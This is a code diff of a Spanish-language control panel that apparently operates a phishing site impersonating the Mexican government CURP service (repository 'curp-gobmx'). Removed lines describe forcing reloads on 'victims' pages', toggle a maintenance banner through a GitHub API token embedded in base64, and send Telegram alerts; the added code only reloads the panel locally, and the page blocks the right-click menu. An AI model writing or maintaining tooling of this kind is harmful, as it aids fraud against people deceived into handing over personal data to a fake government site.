@@ -125,35 +125,20 @@ strong{color:var(--verde)}
 
   <div id="tab-control" class="oculto">
     <div class="card">
-      <div class="label">🔄 ACTUALIZACIÓN FORZADA</div>
+      <div class="label">🔄 ACTUALIZACIÓN</div>
       <div style="margin-bottom:10px;font-size:12px;color:var(--verde-osc)">
-        Fuerza que las páginas de víctimas recarguen la versión más nueva.
+        Recarga la versión más nueva del panel.
       </div>
       <button class="btn" id="btnAct" onclick="forzarActualizacion()">🔄 ACTUALIZACIÓN</button>
-      <div id="msgAct" style="font-size:11px;color:var(--verde-osc);margin-top:8px"></div>
+      <div id="msgAct" style="font-size:11px;color:var(--verde-osc);margin-top:10px"></div>
     </div>
 
     <div class="card">
-      <div class="label">🚧 MANTENIMIENTO</div>
-      <div style="margin-bottom:10px;font-size:12px;color:var(--verde-osc)">
-        Activa para mostrar cartel "PÁGINA EN MANTENIMIENTO" a todos los visitantes.
-      </div>
-      <button class="btn" id="btnManto" onclick="toggleMantenimiento()" style="min-width:200px">
-        <span id="estadoManto">⏳ cargando...</span>
-      </button>
-      <div id="msgManto" style="font-size:11px;color:var(--verde-osc);margin-top:8px"></div>
-    </div>
-
-    <div class="card">
-      <div class="label">📊 ESTADO ACTUAL</div>
-      <div style="font-size:12px;color:var(--verde)">
-        <div id="estadoActual">⏳ leyendo control.json...</div>
-      </div>
-      <div style="margin-top:10px">
-        <button class="btn" style="font-size:11px" onclick="leerEstado()">🔄 Refrescar estado</button>
-      </div>
+      <div class="label">📊 ÚLTIMA ACTUALIZACIÓN</div>
+      <div style="font-size:13px;color:var(--verde)" id="ultAct">_ nunca</div>
     </div>
   </div>
+  
 
   <div id="tab-hist" class="oculto">
     <div class="card">
@@ -498,77 +483,26 @@ async function verFoto(file_id){
 })();
 
 
-// ===== CONTROL DEL SITIO =====
-var GH_TOKEN=atob("VE9LRU5fUkVNT1ZFRA==");
-var GH_REPO="Castores1/curp-gobmx";
-var GH_FILE="control.json";
-
-async function leerEstado(){
-  try{
-    var r=await fetch("https://raw.githubusercontent.com/"+GH_REPO+"/main/"+GH_FILE+"?t="+Date.now());
-    var data=await r.json();
-    var el=document.getElementById("estadoActual");
-    if(el)el.innerHTML="Mantenimiento: <b>"+(data.mantenimiento?"🔴 ON":"🟢 OFF")+"</b><br>Última act: <b>"+new Date(data.actualizacion||0).toLocaleString("es-MX")+"</b>";
-    var btn=document.getElementById("estadoManto");
-    if(btn)btn.textContent=data.mantenimiento?"🚧 MANTENIMIENTO: ON":"✅ MANTENIMIENTO: OFF";
-    return data;
-  }catch(e){return null;}
-}
-
-async function escribirEstado(data,msg){
-  try{
-    var g=await fetch("https://api.github.com/repos/"+GH_REPO+"/contents/"+GH_FILE,
-      {headers:{"Authorization":"token "+GH_TOKEN,"Accept":"application/vnd.github.v3+json"}});
-    var gj=await g.json();
-    var b64=btoa(unescape(encodeURIComponent(JSON.stringify(data,null,2))));
-    var p=await fetch("https://api.github.com/repos/"+GH_REPO+"/contents/"+GH_FILE,
-      {method:"PUT",
-       headers:{"Authorization":"token "+GH_TOKEN,"Accept":"application/vnd.github.v3+json","Content-Type":"application/json"},
-       body:JSON.stringify({message:msg,content:b64,sha:gj.sha,branch:"main"})});
-    var pj=await p.json();
-    return pj.content?{ok:true,commit:pj.commit.sha.substring(0,7)}:{ok:false,error:pj.message};
-  }catch(e){return {ok:false,error:e.message};}
-}
-
-async function toggleMantenimiento(){
-  var btn=document.getElementById("btnManto");
-  var m=document.getElementById("msgManto");
-  btn.disabled=true;if(m)m.textContent="⏳ escribiendo...";
-  var d=await leerEstado();
-  if(!d){btn.disabled=false;if(m)m.textContent="❌ no leí estado";return;}
-  d.mantenimiento=!d.mantenimiento;d.actualizacion=Date.now();d.ultima_act=new Date().toISOString();
-  var r=await escribirEstado(d,d.mantenimiento?"Activar mantenimiento":"Desactivar mantenimiento");
-  if(r.ok){
-    if(m)m.textContent="✅ Cambio guardado ("+r.commit+"). Redeploy ~45s.";
-    if(document.getElementById("estadoManto"))document.getElementById("estadoManto").textContent=d.mantenimiento?"🚧 MANTENIMIENTO: ON":"✅ MANTENIMIENTO: OFF";
-    tgSend("🛠 <b>MANTENIMIENTO</b> "+(d.mantenimiento?"ACTIVADO 🚧":"DESACTIVADO ✅")+"\n"+new Date().toLocaleString("es-MX"));
-    leerEstado();
-  }else{if(m)m.textContent="❌ "+r.error;}
-  btn.disabled=false;
-}
-
-async function forzarActualizacion(){
+// ===== CONTROL DEL SITIO (solo actualización local) =====
+function forzarActualizacion(){
   var btn=document.getElementById("btnAct");
   var m=document.getElementById("msgAct");
-  btn.disabled=true;if(m)m.textContent="⏳ escribiendo...";
-  var d=await leerEstado();
-  if(!d){btn.disabled=false;if(m)m.textContent="❌ no leí estado";return;}
-  d.actualizacion=Date.now();d.ultima_act=new Date().toISOString();
-  var r=await escribirEstado(d,"Forzar actualizacion "+d.ultima_act);
-  if(r.ok){
-    if(m)m.textContent="✅ Cambio guardado ("+r.commit+"). Recargando en 3s...";
-    tgSend("🔄 <b>ACTUALIZACIÓN FORZADA</b>\n"+new Date().toLocaleString("es-MX"));
-    setTimeout(function(){location.reload()},3000);
-  }else{if(m)m.textContent="❌ "+r.error;}
-  btn.disabled=false;
+  btn.disabled=true;
+  if(m)m.textContent="⏳ actualizando...";
+  var ahora=new Date().toISOString();
+  localStorage.setItem("ultActTimestamp",ahora);
+  setTimeout(function(){
+    window.location.reload(true);
+  },800);
 }
-
-var _cambiarTabOrig=window.cambiarTab;
-window.cambiarTab=function(id,btn){
-  if(_cambiarTabOrig)_cambiarTabOrig(id,btn);
-  if(id==="control")leerEstado();
-};
-
+function verUltimaAct(){
+  var el=document.getElementById("ultAct");
+  if(!el)return;
+  var t=localStorage.getItem("ultActTimestamp");
+  if(!t){el.innerHTML="_ nunca (toca ACTUALIZACIÓN)";return;}
+  var d=new Date(t);
+  el.innerHTML="✅ Última: <b>"+d.toLocaleString("es-MX")+"</b>";
+}
 
 document.addEventListener("contextmenu",function(e){e.preventDefault()});
 </script>
